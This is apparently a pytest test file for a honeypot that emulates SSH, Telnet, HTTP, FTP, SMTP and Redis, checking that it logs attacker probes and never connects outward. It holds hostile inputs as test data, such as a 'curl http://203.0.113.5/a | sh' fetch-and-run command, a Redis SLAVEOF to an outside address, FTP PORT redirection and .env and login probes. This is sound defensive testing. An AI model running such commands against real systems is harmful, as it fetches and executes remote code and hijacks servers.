from __future__ import annotations

import asyncio
import base64
import socket

import asyncssh

from honeybot.report import format_stats
from honeybot.vfs import FAKE_UNAME
from tests.conftest import FORBIDDEN_IP, start_bot, wait_intent


def _guard(monkeypatch):
    original = socket.socket.connect

    def connect(self, address):
        host = address[0] if isinstance(address, tuple) else ""
        if host == FORBIDDEN_IP:
            raise AssertionError(f"исходящее соединение на {address}")
        return original(self, address)

    monkeypatch.setattr(socket.socket, "connect", connect)


async def test_http_records_probes_without_reflection(tmp_path):
    bot = await start_bot(tmp_path, {"http"})
    try:
        port = bot.bound["http"]
        env = await _http(
            port,
            b"GET /.env HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n",
        )
        assert b"404" in env
        assert b"DB_PASSWORD" not in env
        body = b"log=admin&pwd=s3cr3t"
        login = await _http(
            port,
            b"POST /wp-login.php HTTP/1.1\r\nHost: x\r\nContent-Length: "
            + str(len(body)).encode()
            + b"\r\nConnection: close\r\n\r\n"
            + body,
        )
        assert b"302" in login
        assert b"s3cr3t" not in login
        secret_id = await wait_intent(bot, "http")
        # Две сессии одного протокола: ждём обе.
        intents = set()
        for _ in range(40):
            stats = await bot.store.stats()
            intents = {row.get("primary_intent") for row in stats["recent"] if row.get("primary_intent")}
            if "web_secret_probe" in intents and "web_login_probe" in intents:
                break
            await asyncio.sleep(0.05)
        assert "web_secret_probe" in intents
        assert "web_login_probe" in intents
        assert secret_id
        auths = []
        for row in (await bot.store.stats())["recent"]:
            auths.extend((await bot.store.bundle(row["id"]))["auths"])
        assert any(row.get("username") == "admin" and row.get("secret") == "s3cr3t" for row in auths)
    finally:
        await bot.stop()


async def test_redis_rejects_slaveof(tmp_path, monkeypatch):
    _guard(monkeypatch)
    bot = await start_bot(tmp_path, {"redis"})
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", bot.bound["redis"])
        writer.write(b"*2\r\n$4\r\nINFO\r\n$11\r\n203.0.113.5\r\n")
        await writer.drain()
        header = await reader.readline()
        assert header.startswith(b"$")
        info = await reader.readexactly(int(header[1:].strip()) + 2)
        assert b"redis_version:" in info
        assert b"203.0.113.5" not in info
        writer.write(b"*3\r\n$7\r\nSLAVEOF\r\n$11\r\n203.0.113.5\r\n$4\r\n6379\r\n")
        await writer.drain()
        error = await reader.readline()
        assert error.startswith(b"-ERR")
        writer.write(b"PING\r\n")
        await writer.drain()
        pong = await reader.readline()
        assert pong == b"+PONG\r\n"
        writer.close()
        await writer.wait_closed()
        session_id = await wait_intent(bot, "redis")
        bundle = await bot.store.bundle(session_id)
        raw = " ".join(row["raw"] for row in bundle["commands"])
        assert "SLAVEOF" in raw.upper()
        assert bundle["session"]["primary_intent"] == "abuse_verb"
    finally:
        await bot.stop()


async def test_ftp_has_no_data_socket(tmp_path, monkeypatch):
    _guard(monkeypatch)
    bot = await start_bot(tmp_path, {"ftp"})
    opened = 0
    original = asyncio.start_server

    async def wrapped(*args, **kwargs):
        nonlocal opened
        opened += 1
        return await original(*args, **kwargs)

    monkeypatch.setattr(asyncio, "start_server", wrapped)
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", bot.bound["ftp"])
        assert (await reader.readline()).startswith(b"220")
        writer.write(b"USER anonymous\r\n")
        await writer.drain()
        assert b"331" in await reader.readline()
        writer.write(b"PASS secret\r\n")
        await writer.drain()
        assert b"230" in await reader.readline()
        writer.write(b"PASV\r\n")
        await writer.drain()
        assert b"425" in await reader.readline()
        writer.write(b"PORT 203,0,113,5,0,80\r\n")
        await writer.drain()
        assert b"502" in await reader.readline()
        writer.write(b"QUIT\r\n")
        await writer.drain()
        await reader.read()
        writer.close()
        assert opened == 0
        session_id = await wait_intent(bot, "ftp")
        bundle = await bot.store.bundle(session_id)
        assert any(row["secret"] == "secret" for row in bundle["auths"])
    finally:
        await bot.stop()


async def test_smtp_accepts_envelope_and_does_not_send(tmp_path, monkeypatch):
    _guard(monkeypatch)
    bot = await start_bot(tmp_path, {"smtp"})
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", bot.bound["smtp"])
        assert (await reader.readline()).startswith(b"220")
        writer.write(b"EHLO client.test\r\n")
        await writer.drain()
        banner = b""
        while b"250 " not in banner:
            banner += await reader.readline()
        writer.write(b"MAIL FROM:<a@test>\r\n")
        await writer.drain()
        assert b"250" in await reader.readline()
        writer.write(b"DATA\r\n")
        await writer.drain()
        assert b"354" in await reader.readline()
        writer.write(b"hello\r\n.\r\n")
        await writer.drain()
        assert b"250" in await reader.readline()
        writer.write(b"QUIT\r\n")
        await writer.drain()
        await reader.read()
        writer.close()
        session_id = await wait_intent(bot, "smtp")
        bundle = await bot.store.bundle(session_id)
        raw = " ".join(row["raw"] for row in bundle["commands"])
        assert "hello" in raw
        assert bundle["session"]["client_banner"] == "client.test"
    finally:
        await bot.stop()


async def test_telnet_fake_shell(tmp_path):
    bot = await start_bot(tmp_path, {"telnet"})
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", bot.bound["telnet"])
        writer.write(b"root\r\nsecret\r\nuname\r\nexit\r\n")
        await writer.drain()
        data = await asyncio.wait_for(reader.read(), 5)
        writer.close()
        assert b"Linux web-01" in data
        assert b"Welcome" in data
        session_id = await wait_intent(bot, "telnet")
        bundle = await bot.store.bundle(session_id)
        assert bundle["session"]["auth_result"] == "fake_accept"
        assert any(row["raw"] == "uname" for row in bundle["commands"])
    finally:
        await bot.stop()


async def test_ssh_exec_does_not_egress(tmp_path, monkeypatch):
    _guard(monkeypatch)
    bot = await start_bot(tmp_path, {"ssh"})
    try:
        async with asyncssh.connect(
            "127.0.0.1",
            port=bot.bound["ssh"],
            username="root",
            password="s3cr3t",
            known_hosts=None,
            preferred_auth="password",
            config=None,
        ) as conn:
            uname = await conn.run("uname -a", check=False)
            piped = await conn.run("curl http://203.0.113.5/a | sh", check=False)
            try:
                await conn.open_connection(FORBIDDEN_IP, 9)
            except asyncssh.Error:
                pass
        assert FAKE_UNAME in (uname.stdout or "")
        assert "saved" in (piped.stdout or "")
        assert FORBIDDEN_IP not in (piped.stdout or "")
        assert "Windows" not in (uname.stdout or "")
        session_id = await wait_intent(bot, "ssh")
        bundle = await bot.store.bundle(session_id)
        raws = [row["raw"] for row in bundle["commands"]]
        assert "uname -a" in raws
        assert any("curl http://203.0.113.5/a | sh" in raw for raw in raws)
        assert any(raw.startswith("direct-tcpip") for raw in raws)
        assert bundle["session"]["primary_intent"] == "fetch_and_run"
        assert bundle["session"]["auth_result"] == "fake_accept"
        text = format_stats(await bot.store.stats())
        assert "s3cr3t" not in text
        banner = bundle["session"]["client_banner"] or ""
        assert banner.startswith("SSH-2.0-")
    finally:
        await bot.stop()


async def test_http_keeps_the_connection(tmp_path):
    bot = await start_bot(tmp_path, {"http"})
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", bot.bound["http"])
        writer.write(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
        await writer.drain()
        first = await _read_http(reader)
        assert b"200" in first.split(b"\r\n", 1)[0]
        assert b"keep-alive" in first.lower()
        writer.write(b"GET /.env HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
        await writer.drain()
        second = await _read_http(reader)
        assert b"404" in second
        assert b"DB_PASSWORD" not in second
        writer.close()
        session_id = await wait_intent(bot, "http")
        bundle = await bot.store.bundle(session_id)
        paths = [row["path"] for row in bundle["http"]]
        assert paths == ["/", "/.env"]
    finally:
        await bot.stop()


async def test_smtp_plain_auth_is_decoded(tmp_path):
    bot = await start_bot(tmp_path, {"smtp"})
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", bot.bound["smtp"])
        assert (await reader.readline()).startswith(b"220")
        token = base64.b64encode(b"\x00alice\x00s3cr3t")
        writer.write(b"AUTH PLAIN " + token + b"\r\nQUIT\r\n")
        await writer.drain()
        data = await asyncio.wait_for(reader.read(), 3)
        writer.close()
        assert b"235" in data
        session_id = await wait_intent(bot, "smtp")
        bundle = await bot.store.bundle(session_id)
        assert any(
            row["username"] == "alice" and row["secret"] == "s3cr3t" for row in bundle["auths"]
        )
        text = format_stats(await bot.store.stats())
        assert "s3cr3t" not in text
    finally:
        await bot.stop()


async def _read_http(reader) -> bytes:
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = await asyncio.wait_for(reader.read(1024), 3)
        if not chunk:
            break
        buf += chunk
    head, _, rest = buf.partition(b"\r\n\r\n")
    length = 0
    for line in head.split(b"\r\n"):
        if line.lower().startswith(b"content-length:"):
            length = int(line.split(b":", 1)[1].strip())
    while len(rest) < length:
        chunk = await asyncio.wait_for(reader.read(length - len(rest)), 3)
        if not chunk:
            break
        rest += chunk
    return head + b"\r\n\r\n" + rest[:length]


async def _http(port: int, payload: bytes) -> bytes:
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    writer.write(payload)
    await writer.drain()
    data = await reader.read()
    writer.close()
    return data
